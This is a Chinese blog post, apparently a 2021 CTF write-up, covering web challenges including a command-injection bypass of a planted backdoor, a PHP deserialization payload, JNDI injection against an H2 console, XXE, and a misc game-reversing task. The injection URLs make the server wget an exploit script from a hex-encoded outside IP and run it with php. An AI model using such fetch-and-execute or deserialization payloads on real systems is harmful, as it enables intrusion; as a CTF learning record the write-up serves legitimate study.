@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh-cn" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Lioders" />
+	
+	
+	
+	<title>CTF线上赛 ｜ </title>
+	
+    
+    
+    <meta name="description" content="WEB 抓黑阔 题目给出黑客攻击。通过流量分析抓到关键后门内容。 访问黑客上传的后门发现可以访问。同时正则限制执行命令 php /w 只允许每个字符为数字字母。并且拼接ec后用exec 执行。这里exec 是没有回显的。 通过测" />
+    
+
+    
+    
+    <meta name="keywords" content="Hugo, Lioders" />
+    
+
+	
+    
+    <link rel="shortcut icon" href="http://example.org/images/favicon.ico" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/zozo.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/highlight.css" />
+
+    
+    
+</head>
+
+<body>
+    <div class="main animate__animated animate__fadeInDown">
+        <div class="nav_container animated fadeInDown">
+    <div class="site_nav" id="site_nav">
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/posts/">Archive</a>
+            </li>
+            
+            <li>
+                <a href="/tags/">Tags</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="menu_icon">
+        <a id="menu_icon"><i class="ri-menu-line"></i></a>
+    </div>
+</div>
+        <div class="header animated fadeInDown">
+    <div class="site_title_container">
+        <div class="site_title">
+            <h1>
+                <a href="http://example.org/">
+                    <span></span>
+                </a>
+            </h1>
+        </div>
+        <div class="description">
+            <p class="sub_title">lioders &#39;s blog</p>
+            <div class="my_socials">
+                
+                
+                <a href="https://github.com/LiodAir" title="github" target="_blank"><i class="ri-github-fill"></i></a>
+                
+                
+                <a href="http://example.org/index.xml" type="application/rss+xml" title="rss" target="_blank"><i
+                        class="ri-rss-fill"></i></a>
+            </div>
+        </div>
+    </div>
+</div>
+        <div class="content">
+            <div class="post_page">
+                <div class="post animate__animated animate__fadeInDown">
+                    <div class="post_title post_detail_title">
+                        <h2><a href='/posts/7%E6%9C%88%E7%9A%84%E4%B8%80%E6%AC%A1ctf/'>CTF线上赛</a></h2>
+                        <span class="date">2021.07.21</span>
+                    </div>
+                    <div class="post_content markdown"><h2 id="web">WEB</h2>
+<h3 id="抓黑阔">抓黑阔</h3>
+<p>题目给出黑客攻击。通过流量分析抓到关键后门内容。
+<img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2e06c59475efe4925a5f72917f214bbc3.png" alt="1.png"></p>
+<p>访问黑客上传的后门发现可以访问。同时正则限制执行命令</p>
+<p>php /w 只允许每个字符为数字字母。并且拼接ec后用exec 执行。这里exec 是没有回显的。
+通过测试换行发现绕过正则限制。本次测试如下
+<img src="https://pic2.58cdn.com.cn/nowater/webim/big/n_v2711ace965308445e82d233b54eb12c2f.png" alt="2.png"></p>
+<p>用数组进行传参。</p>
+<ol>
+<li>通过生成ip地址长整数绕过正则表达式，下载exploit脚本。 </li>
+<li>通过tar命令将无后缀脚本打包，再用php命令执行</li>
+</ol>
+<p>这里IP 由于不能带. 转成16进制即可。 wget 把要执行的php 改为 index.html</p>
+<p>post 参数两次如下：</p>
+<blockquote>
+<p>http://localhost/index.php?name[]=whatever%0a&amp;name[]=mkdir&amp;name[]=test%0a&amp;name[]=cd&amp;name[]=test%0a&amp;name[]=wget&amp;name[]=0x784FACFE</p>
+</blockquote>
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v2706a29c1e33a473c98989b0d3e78e376.png" alt="3.png"></p>
+<p>访问test 目录
+目录存在是由于我们的呢一部分没有显示掉。
+<img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v26b878892f1624d508c74dba59bf58ed5.png" alt="4.png"></p>
+<blockquote>
+<p>http://localhost/index.php?name[]=whatever%0a&amp;name[]=tar&amp;name[]=cvf&amp;name[]=exploit&amp;name[]=test%0a&amp;name[]=php&amp;name[]=exploit</p>
+</blockquote>
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v26047237719924ae29c9bdd868bcaeff4.png" alt="5.png"></p>
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v20f5f16d6eb604641a43d07f1109fa621.png" alt="6.png"></p>
+<h3 id="php-unsafe">PHP Unsafe</h3>
+<p>首先打开链接</p>
+<p><img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v2974d53ed79f143c08279c140e6d283d6.png" alt="7.png"></p>
+<p>通过扫描文件发现存在download.php</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v205a90949dabe4f77867fe0eaa1fbacb6.png" alt="8.png"></p>
+<p>尝试输入download.php.bak 没有结果。
+这是扫到存在download.php~
+发现源码</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2e3cc7e89b2df4c7d8795a81b2c10313b.png" alt="9.png"></p>
+<p>这里利用php md5弱类型绕过。QNKCDZO
+输入这个。发现页面提示跳转到</p>
+<p>http://124.196.1.40:50030//next_file.zip
+下载压缩包发现题目源码</p>
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v2cf5342a063404984852f07689da449a0.png" alt="10.png"></p>
+<p>这里看到传入c 反序列化。同时用到变量覆盖去echo $flag 拿到flag
+一开始的时候笨逼一直没看到
+$c = implode($this-&gt;b);
+一直手动输入c 怎么也没绕过。后来将$b 传数组即可绕过</p>
+<p>$b =  [&lsquo;fl&rsquo;, &lsquo;ag&rsquo;];
+$a 类型不同桡过strcmp函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">test_1</span> <span class="p">{</span>
+  <span class="k">const</span> <span class="no">a</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">;</span>
+  <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
+  <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;fl&#39;</span><span class="p">,</span> <span class="s1">&#39;ag&#39;</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">test_1</span><span class="p">()));</span>
+</code></pre></div><p>生成反序列化payload
+O%3A6%3A&quot;test_1&quot;%3A1%3A%7Bs%3A9%3A&quot;%00test_1%00b&quot;%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A&quot;fl&quot;%3Bi%3A1%3Bs%3A2%3A&quot;ag&quot;%3B%7D%7D</p>
+<p><img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v298273c9f108f420988cd07c160d2d2bc.png" alt="11.png"></p>
+<h3 id="java--群英会">JAVA  群英会</h3>
+<p>我是新来的-JAVA群英会</p>
+<p>这道题我们第一天扫道/doc.html 
+admin/admin123 进入后 一直不知道干什么 。
+后面尝试Shire rce fastjson 都没有效果。后来爆破 队友爆破出</p>
+<p><img src="https://pic3.58cdn.com.cn/nowater/webim/big/n_v2e6e49173a2ba4bde95526adfbcb68e7a.png" alt="13.png"></p>
+<p>还是不知道要干啥 以为通过权限绕过去访问 /form /token 那个接口。</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2fa43d1e9fd094023a398978c7525dadf.png" alt="14.png"></p>
+<p>直到 下午放出的提示。</p>
+<p>/h2 、/druid</p>
+<p>通过访问/h2 一看就是未授权。那个jndi 注入 rce。
+服务器放上JNDI脚本 开始打 我这里换了 5个版本的JNDI 执行命令、弹shell 花了2小时</p>
+<p><img src="https://pic2.58cdn.com.cn/nowater/webim/big/n_v2195179fe239f45c990d88c5a5b1a5f69.png" alt="15.png"></p>
+<p>服务器放入提前准备好的JNDI 包。选好反序列化的payload 后面验证 tomcat 的也可以用。</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2dfe951d570974cedbfe25c79fe7bf107.png" alt="16.png"></p>
+<p><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v289d1f23574ec4fd9abe639b82f7a6de0.png" alt="17.png"></p>
+<p><img src="https://pic2.58cdn.com.cn/nowater/webim/big/n_v226dc2e8e83114b76ab0a27566bf4426d.png" alt="18.png"></p>
+<h3 id="一道简单的计算器">一道简单的计算器</h3>
+<p>目录扫描得：test.php</p>
+<p><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2f8f03a1b2e3d4bb1ae41a5f9fae78c72.png" alt="19.png"></p>
+<p><img src="https://pic1.58cdn.com.cn/nowater/webim/big/n_v2428304489c0c408fa2824c7630f25844.png" alt="20.png"></p>
+<p>通过修改ua头绕过访问限制</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2f8e0c93154d342529be708945da16eef.png" alt="21.png"></p>
+<p>按照提示xxe 抓包确认也确实xxe</p>
+<p><img src="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2ebaa90d4565d470ebb960957a0aa109e.png" alt="22.png"></p>
+<p>得flag：
+flag{a5be0518e560404d8772447b911cee56}</p>
+<h3 id="about-zero-space">About zero space</h3>
+<p>查看源码，发现存在注释Zwsp</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2168653b0d79045f1ac1108830451aa52.png" alt="23.png"></p>
+<p>github搜索源码，发现存在同名可decode的npm项目</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v26339d4b1a91b44708bd9c7898f504f2b.png" alt="24.png"></p>
+<p>检查网页源码，复制，decode+base64_decode</p>
+<p><img src="https://pic6.58cdn.com.cn/nowater/webim/big/n_v205e16297b382469fba1fbdf5a4effe9f.png" alt="25.png"></p>
+<p>获取相对路径，组合密码，获取flag</p>
+<h2 id="misc">Misc</h2>
+<h3 id="i-wanna-be-a-hacker">i wanna be a hacker</h3>
+<p>使用逆向工具jad 进行逆向。然后放入idea 调试。</p>
+<p>修改Hearo 类小人永远不死</p>
+<p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v27bbe2b5d0fe84cf8954384974fe7f86d.png" alt="26.png"></p>
+<p>修改为不死小人 、过五关、斩六将。直接冲。</p>
+<p><img src="https://pic2.58cdn.com.cn/nowater/webim/big/n_v2cf81f7168d60409e9e815613cc5db8f8.png" alt="27.png"></p>
+</div>
+                    <div class="post_footer">
+                        
+                        <div class="meta">
+                            <div class="info">
+                                <span class="field tags">
+                                    <i class="ri-stack-line"></i>
+                                    
+                                    <a href="http://example.org/tags/web/">WEB</a>
+                                    
+                                    <a href="http://example.org/tags/ctf/">CTF</a>
+                                    
+                                </span>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                
+                <div class="doc_comments"></div>
+                
+            </div>
+        </div>
+    </div>
+    <a id="back_to_top" href="#" class="back_to_top"><i class="ri-arrow-up-s-line"></i></a>
+    <footer class="footer">
+    <div class="powered_by">
+        <a href="https://varkai.com">Designed by VarKai,</a>
+        <a href="http://www.gohugo.io/">Proudly published with Hugo</a>
+    </div>
+
+    <div class="footer_slogan">
+        <span>梦想被扼杀的第一个征候就是抱怨没有时间</span>
+    </div>
+</footer>
+    <script src="http://example.org/js/jquery-3.5.1.min.js"></script>
+<link href="http://example.org/css/fancybox.min.css" rel="stylesheet">
+<script src="http://example.org/js/fancybox.min.js"></script>
+<script src="http://example.org/js/zozo.js"></script>
+
+
+
+
+</body>
+
+</html>
